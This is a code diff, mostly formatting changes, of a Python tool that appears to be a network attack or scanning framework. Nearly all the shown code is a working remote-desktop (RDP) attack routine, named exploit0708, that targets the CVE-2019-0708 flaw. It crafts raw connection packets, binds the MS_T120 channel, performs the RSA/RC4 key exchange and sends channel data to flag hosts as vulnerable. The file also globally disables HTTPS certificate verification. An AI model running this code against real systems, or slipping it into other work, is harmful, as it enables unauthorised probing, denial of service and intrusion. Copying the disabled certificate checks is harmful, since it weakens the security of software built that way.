@@ -22,6 +22,7 @@ import threading
 import time
 import traceback
 import urllib
+import uuid
 
 from datetime import datetime
 
@@ -43,9 +44,9 @@ except ImportError:
     import urllib.request as urllib2
 
 
-
-if (not os.environ.get("PYTHONHTTPSVERIFY", "") and
-    getattr(ssl, "_create_unverified_context", None)):
+if not os.environ.get("PYTHONHTTPSVERIFY", "") and getattr(
+    ssl, "_create_unverified_context", None
+):
     ssl._create_default_https_context = ssl._create_unverified_context
 
 htmlunescape = HTMLParser.HTMLParser()
@@ -70,7 +71,7 @@ if platform.system() == "Windows":
 elif PYVERSION > "3.7":
     sys.stdout.reconfigure(encoding="utf-8")
 elif PYVERSION > "3.0":
-    sys.stdout = os.fdopen(sys.stdout.buffer.fileno(), 'w', encoding='utf8')
+    sys.stdout = os.fdopen(sys.stdout.buffer.fileno(), "w", encoding="utf8")
 else:
     sys.stdout = codecs.getwriter("utf-8")(sys.stdout)
 
@@ -130,9 +131,10 @@ class Account:
         return apikey
 
 
+
 # global variable arear
 # icmp client var
-VER="\x01\x01"
+VER = "\x01\x01"
 SEQUENCE = 0
 PACKETSIZE = 1024
 HANDSHAKE = "HELLO"
@@ -145,11 +147,11 @@ gSOCKETID = []
 gCLIENTOBJ = []
 ICMPSOCK = None
 
-VER="\x01\x01"
+VER = "\x01\x01"
 HANDSHAKE = "HELLO"
 
 # for https url
-ca_certs ="""##
+ca_certs = """##
 ## Bundle of CA Root Certificates
 ##
 ## Certificate data from Mozilla as of: Fri Jan 22 12:03:41 2021 GMT
@@ -3420,6 +3422,7 @@ if platform.system() != "Windows":
         return "\033[93m" + string + "\033[0m"
 
 else:
+
     def info(string):
         return string
 
@@ -3437,9 +3440,10 @@ else:
 
     def attention(string):
         return string
-        
+
     def yellow(string):
         return string
+
 
 # delete color string for file write
 def fparse(string):
@@ -3453,6 +3457,7 @@ def fparse(string):
 
 
 # 0708 start
+
 
 class ARC4:
     def __init__(self, key):
@@ -3471,66 +3476,70 @@ class ARC4:
 
     def translate(self, plain):
         state = self.state
-        enc=""
+        enc = ""
         for i in range(len(plain)):
             self.x = (self.x + 1) % 256
             self.y = (self.y + state[self.x]) % 256
             (state[self.x], state[self.y]) = (state[self.y], state[self.x])
-            xorIndex = (state[self.x]+state[self.y]) % 256
+            xorIndex = (state[self.x] + state[self.y]) % 256
             enc += chr(ord(plain[i]) ^ state[xorIndex])
         return enc
 
+
 def check_rdp_vuln(username):
-    x_224_conn_req = "\x03\x00\x00" + "{0}"                       # TPKT Header
-    x_224_conn_req +=  chr(33+len(username))      # X.224: Length indicator
-    x_224_conn_req += "\xe0"                                  # X.224: Type - TPDU
-    x_224_conn_req += "\x00\x00"                              # X.224: Destination reference
-    x_224_conn_req += "\x00\x00"                              # X.224: Source reference
-    x_224_conn_req += "\x00"                                  # X.224: Class and options
-    x_224_conn_req += "\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d" # "Cookie: mstshash=
-    x_224_conn_req +=  username                         # coookie value 
-    x_224_conn_req += "\x0d\x0a"                              # Cookie terminator sequence
-    x_224_conn_req += "\x01"                                  # Type: RDP_NEG_REQ)
-    x_224_conn_req +=  "\x00"                                 # RDP_NEG_REQ::flags 
-    x_224_conn_req +=  "\x08\x00"                             # RDP_NEG_REQ::length (8 bytes)
-    x_224_conn_req +=  "\x00\x00\x00\x00"                     # Requested protocols (PROTOCOL_RDP)
+    x_224_conn_req = "\x03\x00\x00" + "{0}"  # TPKT Header
+    x_224_conn_req += chr(33 + len(username))  # X.224: Length indicator
+    x_224_conn_req += "\xe0"  # X.224: Type - TPDU
+    x_224_conn_req += "\x00\x00"  # X.224: Destination reference
+    x_224_conn_req += "\x00\x00"  # X.224: Source reference
+    x_224_conn_req += "\x00"  # X.224: Class and options
+    x_224_conn_req += "\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d"  # "Cookie: mstshash=
+    x_224_conn_req += username  # coookie value
+    x_224_conn_req += "\x0d\x0a"  # Cookie terminator sequence
+    x_224_conn_req += "\x01"  # Type: RDP_NEG_REQ)
+    x_224_conn_req += "\x00"  # RDP_NEG_REQ::flags
+    x_224_conn_req += "\x08\x00"  # RDP_NEG_REQ::length (8 bytes)
+    x_224_conn_req += "\x00\x00\x00\x00"  # Requested protocols (PROTOCOL_RDP)
 
     return x_224_conn_req
+
 
 def pdu_connect_initial(hostname):
     host_name = ""
     for i in hostname:
-        host_name += struct.pack("<h",ord(i))
-    host_name += "\x00"*(32-len(host_name))
+        host_name += struct.pack("<h", ord(i))
+    host_name += "\x00" * (32 - len(host_name))
 
-    mcs_gcc_request = ("\x03\x00\x01\xca" # TPKT Header
-    "\x02\xf0\x80"             # x.224
-    "\x7f\x65\x82\x01\xbe" # change here
-    "\x04\x01\x01\x04"
-    "\x01\x01\x01\x01\xff"
-    "\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20"
-    "\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02"
-    "\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01\x4b" # chnage here
-    "\x00\x05\x00\x14\x7c\x00\x01\x81\x42" # change here - ConnectPDU
-    "\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34" # chnage here 
-    "\x01\xc0\xd8\x00\x04\x00\x08\x00\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00")
+    mcs_gcc_request = (
+        "\x03\x00\x01\xca"  # TPKT Header
+        "\x02\xf0\x80"  # x.224
+        "\x7f\x65\x82\x01\xbe"  # change here
+        "\x04\x01\x01\x04"
+        "\x01\x01\x01\x01\xff"
+        "\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20"
+        "\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02"
+        "\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01\x4b"  # chnage here
+        "\x00\x05\x00\x14\x7c\x00\x01\x81\x42"  # change here - ConnectPDU
+        "\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34"  # chnage here
+        "\x01\xc0\xd8\x00\x04\x00\x08\x00\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00"
+    )
 
+    mcs_gcc_request += host_name  # Client name -32 Bytes - we45-lt35
 
-    mcs_gcc_request += host_name # Client name -32 Bytes - we45-lt35
-    
     mcs_gcc_request += (
-    "\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00"
-    "\x03\xc0"
-    "\x44\x00"
-    "\x04\x00\x00\x00" #channel count
-    "\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00" #cliprdr
-    "\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00" #MS_T120
-    "\x72\x64\x70\x73\x6e\x64\x00\x00\xc0\x00\x00\x00" #rdpsnd
-    "\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00" #snddbg
-    "\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00" #rdpdr
+        "\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00"
+        "\x03\xc0"
+        "\x44\x00"
+        "\x04\x00\x00\x00"  # channel count
+        "\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00"  # cliprdr
+        "\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00"  # MS_T120
+        "\x72\x64\x70\x73\x6e\x64\x00\x00\xc0\x00\x00\x00"  # rdpsnd
+        "\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00"  # snddbg
+        "\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00"  # rdpdr
     )
 
     return mcs_gcc_request
+
 
 def hex_str_conv(hex_str):
     hex_res = ""
@@ -3541,34 +3550,36 @@ def hex_str_conv(hex_str):
 
     return hex_res
 
+
 def bin_to_hex(s):
     return s.encode("hex")
 
+
 def bytes_to_bignum(bytesIn, order="little"):
-    
+
     if order == "little":
         bytesIn = bytesIn[::-1]
 
     bytes = bin_to_hex(bytesIn)
     s = "0x" + bytes
-    return int(s,16)
+    return int(s, 16)
+
 
 def int_to_bytestring(daInt, host):
-    hex_pkt = "%x"%daInt
-    #print(hex_pkt)
-    #print(hex_pkt.decode("hex"))
+    hex_pkt = "%x" % daInt
     try:
-        hex_res = hex_pkt.decode("hex")[:: -1]
+        hex_res = hex_pkt.decode("hex")[::-1]
     except TypeError as e:
-        print("[+] Maybe Vulnerable " + host + " "*40)
+        print("[+] Maybe Vulnerable " + host + " " * 40)
         os._exit(0)
         sys.exit()
-    
+
     return hex_res
 
 
 def rsa_encrypt(bignum, rsexp, rsmod):
-    return (bignum ** rsexp) % rsmod
+    return (bignum**rsexp) % rsmod
+
 
 def rdp_rc4_crypt(rc4obj, data):
     return rc4obj.translate(data)
@@ -3576,28 +3587,26 @@ def rdp_rc4_crypt(rc4obj, data):
 
 def rdp_parse_serverdata(pkt):
     ptr = 0
-    rdp_pkt = pkt[0x49: ]
+    rdp_pkt = pkt[0x49:]
 
     while ptr < len(rdp_pkt):
-        header_type = rdp_pkt[ptr: ptr+2]
-        header_length = struct.unpack("<h",rdp_pkt[ptr+2: ptr+4])[0]
-
+        header_type = rdp_pkt[ptr : ptr + 2]
+        header_length = struct.unpack("<h", rdp_pkt[ptr + 2 : ptr + 4])[0]
 
         if header_type == "\x02\x0c":
 
-            server_random = rdp_pkt[ptr+20: ptr+52]
-            public_exponent = rdp_pkt[ptr+84: ptr+88]
+            server_random = rdp_pkt[ptr + 20 : ptr + 52]
+            public_exponent = rdp_pkt[ptr + 84 : ptr + 88]
 
-            
-            modulus = rdp_pkt[ptr+88: ptr+152]
-            rsa_magic = rdp_pkt[ptr+68: ptr+72]
+            modulus = rdp_pkt[ptr + 88 : ptr + 152]
+            rsa_magic = rdp_pkt[ptr + 68 : ptr + 72]
 
             if rsa_magic != "RSA1":
                 pass
 
-            bitlen = struct.unpack("<L",rdp_pkt[ptr+72:ptr+76])[0] - 8
-            modulus = rdp_pkt[ptr+88:ptr+87+1+bitlen]
-    
+            bitlen = struct.unpack("<L", rdp_pkt[ptr + 72 : ptr + 76])[0] - 8
+            modulus = rdp_pkt[ptr + 88 : ptr + 87 + 1 + bitlen]
+
         ptr += header_length
 
     rsmod = bytes_to_bignum(modulus)
@@ -3607,10 +3616,9 @@ def rdp_parse_serverdata(pkt):
     return rsmod, rsexp, rsran, server_random, bitlen
 
 
-
 def pdu_channel_request(userid, channel):
     join_req = "\x03\x00\x00\x0c\x02\xf0\x80\x38"
-    join_req+= struct.pack(">hh",userid,channel)
+    join_req += struct.pack(">hh", userid, channel)
     return join_req
 
 
@@ -3618,17 +3626,18 @@ def mcs_erect_domain_pdu():
     mcs_erect_domain_pdu = "\x03\x00\x00\x0c\x02\xf0\x80\x04\x00\x01\x00\x01"
     return mcs_erect_domain_pdu
 
+
 def msc_attach_user_pdu():
     msc_attach_user_pdu = "\x03\x00\x00\x08\x02\xf0\x80\x28"
     return msc_attach_user_pdu
 
-def pdu_security_exchange(rcran, rsexp, rsmod, bitlen,host):
+
+def pdu_security_exchange(rcran, rsexp, rsmod, bitlen, host):
     encrypted_rcran_bignum = rsa_encrypt(rcran, rsexp, rsmod)
-    encrypted_rcran = int_to_bytestring(encrypted_rcran_bignum,host)
+    encrypted_rcran = int_to_bytestring(encrypted_rcran_bignum, host)
 
     bitlen += 8
-    bitlen_hex = struct.pack("<L",bitlen)
-
+    bitlen_hex = struct.pack("<L", bitlen)
 
     userdata_length = 8 + bitlen
     userdata_length_low = userdata_length & 0xFF
@@ -3637,21 +3646,22 @@ def pdu_security_exchange(rcran, rsexp, rsmod, bitlen,host):
     flags = 0x80 | userdata_length_high
 
     pkt = "\x03\x00"
-    pkt += struct.pack(">h",userdata_length+15) # TPKT
-    pkt += "\x02\xf0\x80" # X.224
-    pkt += "\x64" # sendDataRequest
-    pkt += "\x00\x08" # intiator userId
-    pkt += "\x03\xeb" # channelId = 1003
-    pkt += "\x70" # dataPriority
-    pkt += struct.pack("h",flags)[0]
-    pkt += struct.pack("h",userdata_length_low)[0] # UserData length
-    pkt += "\x01\x00" # securityHeader flags
-    pkt += "\x00\x00" # securityHeader flagsHi
-    pkt += bitlen_hex # securityPkt length
-    pkt += encrypted_rcran # 64 bytes encrypted client random
-    pkt += "\x00\x00\x00\x00\x00\x00\x00\x00" # 8 bytes rear padding (always present)
+    pkt += struct.pack(">h", userdata_length + 15)  # TPKT
+    pkt += "\x02\xf0\x80"  # X.224
+    pkt += "\x64"  # sendDataRequest
+    pkt += "\x00\x08"  # intiator userId
+    pkt += "\x03\xeb"  # channelId = 1003
+    pkt += "\x70"  # dataPriority
+    pkt += struct.pack("h", flags)[0]
+    pkt += struct.pack("h", userdata_length_low)[0]  # UserData length
+    pkt += "\x01\x00"  # securityHeader flags
+    pkt += "\x00\x00"  # securityHeader flagsHi
+    pkt += bitlen_hex  # securityPkt length
+    pkt += encrypted_rcran  # 64 bytes encrypted client random
+    pkt += "\x00\x00\x00\x00\x00\x00\x00\x00"  # 8 bytes rear padding (always present)
 
     return pkt
+
 
 def rdp_salted_hash(s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):
     hash_sha1 = hashlib.new("sha1")
@@ -3665,7 +3675,7 @@ def rdp_salted_hash(s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):
     hash_md5.update(binascii.unhexlify(hash_sha1.hexdigest()))
 
     return binascii.unhexlify(hash_md5.hexdigest())
-     
+
 
 def rdp_final_hash(k, clientRandom_bytes, serverRandom_bytes):
     md5 = hashlib.md5()
@@ -3676,6 +3686,7 @@ def rdp_final_hash(k, clientRandom_bytes, serverRandom_bytes):
 
     return binascii.unhexlify(md5.hexdigest())
 
+
 def rdp_hmac(mac_salt_key, data_content):
     sha1 = hashlib.sha1()
     md5 = hashlib.md5()
@@ -3685,7 +3696,7 @@ def rdp_hmac(mac_salt_key, data_content):
 
     sha1.update(mac_salt_key)
     sha1.update(pad1)
-    sha1.update(struct.pack("<L",len(data_content)))
+    sha1.update(struct.pack("<L", len(data_content)))
     sha1.update(data_content)
 
     md5.update(mac_salt_key)
@@ -3695,26 +3706,41 @@ def rdp_hmac(mac_salt_key, data_content):
     return binascii.unhexlify(md5.hexdigest())
 
 
-
 def rdp_calculate_rc4_keys(client_random, server_random):
 
     preMasterSecret = client_random[0:24] + server_random[0:24]
-    masterSecret = rdp_salted_hash(preMasterSecret,"A",client_random,server_random) +  rdp_salted_hash(preMasterSecret,"BB",client_random,server_random) + rdp_salted_hash(preMasterSecret,"CCC",client_random,server_random)
-    sessionKeyBlob = rdp_salted_hash(masterSecret,"X",client_random,server_random) +  rdp_salted_hash(masterSecret,"YY",client_random,server_random) + rdp_salted_hash(masterSecret,"ZZZ",client_random,server_random)
-    initialClientDecryptKey128 = rdp_final_hash(sessionKeyBlob[16:32], client_random, server_random)
-    initialClientEncryptKey128 = rdp_final_hash(sessionKeyBlob[32:48], client_random, server_random)
+    masterSecret = (
+        rdp_salted_hash(preMasterSecret, "A", client_random, server_random)
+        + rdp_salted_hash(preMasterSecret, "BB", client_random, server_random)
+        + rdp_salted_hash(preMasterSecret, "CCC", client_random, server_random)
+    )
+    sessionKeyBlob = (
+        rdp_salted_hash(masterSecret, "X", client_random, server_random)
+        + rdp_salted_hash(masterSecret, "YY", client_random, server_random)
+        + rdp_salted_hash(masterSecret, "ZZZ", client_random, server_random)
+    )
+    initialClientDecryptKey128 = rdp_final_hash(
+        sessionKeyBlob[16:32], client_random, server_random
+    )
+    initialClientEncryptKey128 = rdp_final_hash(
+        sessionKeyBlob[32:48], client_random, server_random
+    )
 
     macKey = sessionKeyBlob[0:16]
 
-
-    return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob
+    return (
+        initialClientEncryptKey128,
+        initialClientDecryptKey128,
+        macKey,
+        sessionKeyBlob,
+    )
 
 
 def pdu_client_info():
     data = "000000003301000000000a000000000000000000"
-    data += "75007300650072003000" # FIXME: username
+    data += "75007300650072003000"  # FIXME: username
     data += "000000000000000002001c00"
-    data += "3100390032002e003100360038002e0031002e00320030003800" # FIXME: ip
+    data += "3100390032002e003100360038002e0031002e00320030003800"  # FIXME: ip
     data += "00003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000"
 
     return binascii.unhexlify(data)
@@ -3729,45 +3755,66 @@ def pdu_client_persistent_key_list():
     data = "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
     return binascii.unhexlify(data)
 
-def rdp_encrypted_pkt(data, rc4enckey, hmackey, flags = "\x08\x00", flagsHi = "\x00\x00", channelId="\x03\xeb"):
+
+def rdp_encrypted_pkt(
+    data, rc4enckey, hmackey, flags="\x08\x00", flagsHi="\x00\x00", channelId="\x03\xeb"
+):
 
     userData_len = len(data) + 12
     udl_with_flag = 0x8000 | userData_len
-    pkt = "\x02\xf0\x80" # X.224
-    pkt += "\x64" # sendDataRequest
-    pkt += "\x00\x08" # intiator userId .. TODO: for a functional client this isn"t static
-    pkt += channelId # channelId = 1003
-    pkt += "\x70" # dataPriority
-    pkt += binascii.unhexlify("%x"%udl_with_flag)
-    pkt += flags #{}"\x48\x00" # flags  SEC_INFO_PKT | SEC_ENCRYPT
-    pkt += flagsHi # flagsHi
+    pkt = "\x02\xf0\x80"  # X.224
+    pkt += "\x64"  # sendDataRequest
+    pkt += (
+        "\x00\x08"  # intiator userId .. TODO: for a functional client this isn"t static
+    )
+    pkt += channelId  # channelId = 1003
+    pkt += "\x70"  # dataPriority
+    pkt += binascii.unhexlify("%x" % udl_with_flag)
+    pkt += flags  # {}"\x48\x00" # flags  SEC_INFO_PKT | SEC_ENCRYPT
+    pkt += flagsHi  # flagsHi
 
     pkt += rdp_hmac(hmackey, data)[0:8]
     pkt += rdp_rc4_crypt(rc4enckey, data)
 
     tpkt = "\x03\x00"
-    tpkt +=struct.pack(">h",len(pkt) + 4)
-    tpkt +=pkt
+    tpkt += struct.pack(">h", len(pkt) + 4)
+    tpkt += pkt
 
     return tpkt
 
-def try_check(s, rc4enckey, hmackey,host):
-    for i in range(0,6):
+
+def try_check(s, rc4enckey, hmackey, host):
+    for i in range(0, 6):
         res = s.recv(1024)
-    
-    for i in range(0,6):
-        pkt = rdp_encrypted_pkt(binascii.unhexlify("100000000300000000000000020000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
+
+    for i in range(0, 6):
+        pkt = rdp_encrypted_pkt(
+            binascii.unhexlify("100000000300000000000000020000000000000000000000"),
+            rc4enckey,
+            hmackey,
+            "\x08\x00",
+            "\x00\x00",
+            "\x03\xed",
+        )
         s.sendall(pkt)
-        pkt = rdp_encrypted_pkt(binascii.unhexlify("20000000030000000000000000000000020000000000000000000000000000000000000000000000"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
+        pkt = rdp_encrypted_pkt(
+            binascii.unhexlify(
+                "20000000030000000000000000000000020000000000000000000000000000000000000000000000"
+            ),
+            rc4enckey,
+            hmackey,
+            "\x08\x00",
+            "\x00\x00",
+            "\x03\xed",
+        )
         s.sendall(pkt)
 
-        for i in range(0,4):
-          res = s.recv(1024)
-          if binascii.unhexlify("0300000902f0802180") in res:
-            #print("[+] Found MCS Disconnect Provider Ultimatum PDU Packet")
-            print("[+] Vulnerable " + host + " "*40)
-            #print("[+] HexDump: MCS Disconnect Provider Ultimatum PDU")
-
+        for i in range(0, 4):
+            res = s.recv(1024)
+            if binascii.unhexlify("0300000902f0802180") in res:
+                # print("[+] Found MCS Disconnect Provider Ultimatum PDU Packet")
+                print("[+] Vulnerable " + host + " " * 40)
+                # print("[+] HexDump: MCS Disconnect Provider Ultimatum PDU")
 
 
 def exploit0708(host, port=3389, hostname="", username=""):
@@ -3775,10 +3822,10 @@ def exploit0708(host, port=3389, hostname="", username=""):
     s.settimeout(args.timeout)
     try:
         port = int(port)
-        s.connect((host,port))
+        s.connect((host, port))
 
         x_224_conn_req = check_rdp_vuln(username)
-        s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
+        s.sendall(x_224_conn_req.format(chr(33 + len(username) + 5)))
         s.recv(8192)
 
         s.sendall(pdu_connect_initial(hostname))
@@ -3788,7 +3835,6 @@ def exploit0708(host, port=3389, hostname="", username=""):
         return
     except ValueError as e:
         print("Intput error")
-        
 
     try:
         res = s.recv(10000)
@@ -3797,10 +3843,8 @@ def exploit0708(host, port=3389, hostname="", username=""):
     except socket.error as e:
         return
 
-
     try:
         rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)
-
 
         s.sendall(mcs_erect_domain_pdu())
 
@@ -3808,7 +3852,7 @@ def exploit0708(host, port=3389, hostname="", username=""):
 
         res = s.recv(8192)
         mcs_packet = bytearray(res)
-        user1= mcs_packet[9] + mcs_packet[10]
+        user1 = mcs_packet[9] + mcs_packet[10]
 
         s.sendall(pdu_channel_request(user1, 1009))
         s.recv(8192)
@@ -3828,31 +3872,62 @@ def exploit0708(host, port=3389, hostname="", username=""):
         client_rand = "\x41" * 32
         rcran = bytes_to_bignum(client_rand)
 
-        s.sendall(pdu_security_exchange(rcran, rsexp, rsmod, bitlen,host))
+        s.sendall(pdu_security_exchange(rcran, rsexp, rsmod, bitlen, host))
 
-        rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)
+        rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(
+            client_rand, server_rand
+        )
 
         rc4enckey = ARC4(rc4encstart)
 
         s.sendall(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
         res = s.recv(8192)
 
-
         res = s.recv(8192)
 
-        s.sendall(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))
+        s.sendall(
+            rdp_encrypted_pkt(
+                pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"
+            )
+        )
 
-        synch = rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
-        coop = rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
+        synch = rdp_encrypted_pkt(
+            binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"),
+            rc4enckey,
+            hmackey,
+        )
+        coop = rdp_encrypted_pkt(
+            binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"),
+            rc4enckey,
+            hmackey,
+        )
         s.sendall(synch + coop)
 
-        s.sendall(rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))
+        s.sendall(
+            rdp_encrypted_pkt(
+                binascii.unhexlify(
+                    "1a001700f103ea03010000010c00140000000100000000000000"
+                ),
+                rc4enckey,
+                hmackey,
+            )
+        )
 
-        s.sendall(rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey))
+        s.sendall(
+            rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey)
+        )
 
